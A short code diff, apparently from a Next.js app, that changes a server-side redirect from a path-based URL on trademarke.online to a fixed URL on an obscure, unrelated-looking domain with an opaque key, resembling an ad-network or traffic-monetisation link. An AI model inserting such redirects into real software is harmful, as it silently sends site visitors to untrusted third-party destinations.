@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://trademarke.online/graphql/` + encodeURI(path as string)
+					`https://embitterlorrycar.com/ymakufiq?key=2241b52e1eee2cdf20a819a9455c409a/`
 				}`,
 			},
 		};
